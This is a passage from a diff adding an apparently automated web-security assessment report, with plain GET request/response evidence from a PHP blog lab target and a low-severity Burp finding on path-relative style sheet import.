+                    &lt;p&gt;Category: Cooking&lt;/p&gt;
+                    &lt;img src='images/mediterranean-diet.jpg' alt='Mediterranean Diet Secrets' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Unlock the longevity secrets of the Mediterranean diet and discover recipes that combine both taste and health....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Art of French Baking&lt;/h2&gt;
+                    &lt;p&gt;Category: Cooking&lt;/p&gt;
+                    &lt;img src='images/french-baking.jpg' alt='The Art of French Baking' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Master the art of French baking with these simple steps for making the perfect croissant....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Beyond the Camera Lens&lt;/h2&gt;
+                    &lt;p&gt;Category: Photography&lt;/p&gt;
+                    &lt;img src='images/camera-lens.jpg' alt='Beyond the Camera Lens' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Exploring the art of photography through a lens of expression and creativity, where every picture tells a story....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Urban Photography Tips&lt;/h2&gt;
+                    &lt;p&gt;Category: Photography&lt;/p&gt;
+                    &lt;img src='images/urban-photography.jpg' alt='Urban Photography Tips' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Capture the essence of urban life with these practical tips on urban photography, from choosing the right gear to finding the perfect angle....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Healing Power of Yoga&lt;/h2&gt;
+                    &lt;p&gt;Category: Health&lt;/p&gt;
+                    &lt;img src='images/yoga.jpg' alt='The Healing Power of Yoga' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Discover the transformative power of yoga on your body and mind, featuring success stories and tips for beginners....&lt;/p&gt;
+                &lt;/div&gt;&lt;/div&gt;
+&lt;a href=&quot;admin.php&quot;&gt;Admin Login&lt;/a&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy3bc0h-d</code> — <code>artifacts/s-0001/ev-mqy3bc0h-d/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32821
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 5666
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 17:56:08 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Blog Home&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;container&quot;&gt;
+    &lt;h1&gt;Welcome to Our Blog&lt;/h1&gt;
+
+
+    &lt;form action=&quot;&quot; method=&quot;GET&quot;&gt;
+        &lt;label for=&quot;category&quot;&gt;Choose a category:&lt;/label&gt;
+        &lt;select name=&quot;category&quot; id=&quot;category&quot; onchange=&quot;this.form.submit()&quot;&gt;
+            &lt;option value=&quot;&quot;&gt;All Categories&lt;/option&gt;        
+            &lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Nature' &gt;Nature&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Tech' &gt;Tech&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Cooking' &gt;Cooking&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Photography' &gt;Photography&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Health' &gt;Health&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Secret' &gt;Secret&lt;/option&gt;        &lt;/select&gt;
+    &lt;/form&gt;
+
+    &lt;div class='post'&gt;
+                    &lt;h2&gt;The Magic of Morning Dew&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/morning-dew.jpg' alt='The Magic of Morning Dew' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Experience the serene beauty of morning dew as it glistens on the fresh green leaves, transforming the ordinary garden into a sparkling jewel under the sunrise....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Sunset Serenades&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/sunset.jpg' alt='Sunset Serenades' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;As the sun sets, the sky turns a palette of deep oranges, fiery reds, and calming purples, offering a perfect backdrop for an evening under the stars....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Forest Whisperings&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/forest.jpg' alt='Forest Whisperings' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Walking through the forest, one can hear the whispers of ancient trees, rustling leaves telling tales of old in the crisp, clean air....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Decoding Tech Trends&lt;/h2&gt;
+                    &lt;p&gt;Category: Tech&lt;/p&gt;
+                    &lt;img src='images/tech-trends.jpg' alt='Decoding Tech Trends' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;An analysis of emerging technology trends that will shape our future, from AI advancements to the rise of quantum computing....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Future of Robotics&lt;/h2&gt;
+                    &lt;p&gt;Category: Tech&lt;/p&gt;
+                    &lt;img src='images/robotics.jpg' alt='The Future of Robotics' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Exploring the potential impacts of robotics in various industries, and how they are set to revolutionize efficiency and productivity....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Mediterranean Diet Secrets&lt;/h2&gt;
+                    &lt;p&gt;Category: Cooking&lt;/p&gt;
+                    &lt;img src='images/mediterranean-diet.jpg' alt='Mediterranean Diet Secrets' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Unlock the longevity secrets of the Mediterranean diet and discover recipes that combine both taste and health....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Art of French Baking&lt;/h2&gt;
+                    &lt;p&gt;Category: Cooking&lt;/p&gt;
+                    &lt;img src='images/french-baking.jpg' alt='The Art of French Baking' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Master the art of French baking with these simple steps for making the perfect croissant....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Beyond the Camera Lens&lt;/h2&gt;
+                    &lt;p&gt;Category: Photography&lt;/p&gt;
+                    &lt;img src='images/camera-lens.jpg' alt='Beyond the Camera Lens' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Exploring the art of photography through a lens of expression and creativity, where every picture tells a story....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Urban Photography Tips&lt;/h2&gt;
+                    &lt;p&gt;Category: Photography&lt;/p&gt;
+                    &lt;img src='images/urban-photography.jpg' alt='Urban Photography Tips' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Capture the essence of urban life with these practical tips on urban photography, from choosing the right gear to finding the perfect angle....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Healing Power of Yoga&lt;/h2&gt;
+                    &lt;p&gt;Category: Health&lt;/p&gt;
+                    &lt;img src='images/yoga.jpg' alt='The Healing Power of Yoga' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Discover the transformative power of yoga on your body and mind, featuring success stories and tips for beginners....&lt;/p&gt;
+                &lt;/div&gt;&lt;/div&gt;
+&lt;a href=&quot;admin.php&quot;&gt;Admin Login&lt;/a&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-5">
+<h3><span class="badge" style="background:#5f7d8c">INFO</span> 5. [burp] Path-relative style sheet import (3 URLs)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):&lt;ol&gt;&lt;li&gt;The original response contains a path-relative style sheet import (see response 1).&lt;/li&gt;&lt;li&gt;When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).&lt;/li&gt;&lt;li&gt;Response 2 can be made to render in a browser's quirks mode. The page does not contain a doctype directive, and  [+2 more URL(s): http://target.local:32821/admin.php, http://target.local:32821/index.php] @ http://target.local:32821/</div>
+<div><b>Reproduction</b></div><pre>Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqy3sz3x-1u</code> — <code>artifacts/_/ev-mqy3sz3x-1u/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32821
+
+GET / HTTP/1.1
+Host: target.local:32821
+Accept: */*</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0
+
+HTTP/1.1 200 OK
+Date: Sun, 28 Jun 2026 18:09:21 GMT
+Server: Apache/2.4.54 (Debian)
+X-Powered-By: PHP/7.4.33
+Vary: Accept-Encoding
+Content-Length: 5666
+Content-Type: text/html; charset=UTF-8
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Blog Home&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;container&quot;&gt;
+    &lt;h1&gt;Welcome to Our Blog&lt;/h1&gt;
+
+
+    &lt;form action=&quot;&quot; method=&quot;GET&quot;&gt;
+        &lt;label for=&quot;category&quot;&gt;Choose a category:&lt;/label&gt;
+        &lt;select name=&quot;category&quot; id=&quot;category&quot; onchange=&quot;this.form.submit()&quot;&gt;
+            &lt;option value=&quot;&quot;&gt;All Categories&lt;/option&gt;        
+            &lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Nature' &gt;Nature&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Tech' &gt;Tech&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Cooking' &gt;Cooking&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Photography' &gt;Photography&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Health' &gt;Health&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Secret' &gt;Secret&lt;/option&gt;        &lt;/select&gt;
+    &lt;/form&gt;
+
+    &lt;div class='post'&gt;
+                    &lt;h2&gt;The Magic of Morning Dew&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/morning-dew.jpg' alt='The Magic of Morning Dew' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Experience the serene beauty of morning dew as it glistens on the fresh green leaves, transforming the ordinary garden into a sparkling jewel under the sunrise....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Sunset Serenades&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/sunset.jpg' alt='Sunset Serenades' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;As the sun sets, the sky turns a palette of deep oranges, fiery reds, and calming purples, offering a perfect backdrop for an evening under the stars....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Forest Whisperings&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/forest.jpg' alt='Forest Whisperings' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Walking through the forest, one can hear the whispers of ancient trees, rustling leaves telling tales of old in the crisp, clean air....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Decoding Tech Trends&lt;/h2&gt;
+                    &lt;p&gt;Category: Tech&lt;/p&gt;
+                    &lt;img src='images/tech-trends.jpg' alt='Decoding Tech Trends' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;An analysis of emerging technology trends that will shape our future, from AI advancements to the rise of quantum computing....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Future of Robotics&lt;/h2&gt;
+                    &lt;p&gt;Category: Tech&lt;/p&gt;
+                    &lt;img src='images/robotics.jpg' alt='The Future of Robotics' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Exploring the potential impacts of robotics in various industries, and how they are set to revolutionize efficiency and productivity....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Mediterranean Diet Secrets&lt;/h2&gt;
+                    &lt;p&gt;Category: Cooking&lt;/p&gt;
+                    &lt;img src='images/mediterranean-diet.jpg' alt='Mediterranean Diet Secrets' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Unlock the longevity secrets of the Mediterranean diet and discover recipes that combine both taste and health....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Art of French Baking&lt;/h2&gt;
+                    &lt;p&gt;Category: Cooking&lt;/p&gt;
+                    &lt;img src='images/french-baking.jpg' alt='The Art of French Baking' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Master the art of French baking with these simple steps for making the perfect croissant....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Beyond the Camera Lens&lt;/h2&gt;
+                    &lt;p&gt;Category: Photography&lt;/p&gt;
+                    &lt;img src='images/camera-lens.jpg' alt='Beyond the Camera Lens' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Exploring the art of photography through a lens of expression and creativity, where every picture tells a story....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Urban Photography Tips&lt;/h2&gt;
+                    &lt;p&gt;Category: Photography&lt;/p&gt;
+                    &lt;img src='images/urban-photography.jpg' alt='Urban Photography Tips' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Capture the essence of urban life with these practical tips on urban photography, from choosing the right gear to finding the perfect angle....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Healing Power of Yoga&lt;/h2&gt;
+                    &lt;p&gt;Category: Health&lt;/p&gt;
+                    &lt;img src='images/yoga.jpg' alt='The Healing Power of Yoga' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Discover the transformative power of yoga on your body and mind, featuring success stories and tips for beginners....&lt;/p&gt;
+                &lt;/div&gt;&lt;/div&gt;
+&lt;a href=&quot;admin.php&quot;&gt;Admin Login&lt;/a&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+</body></html>
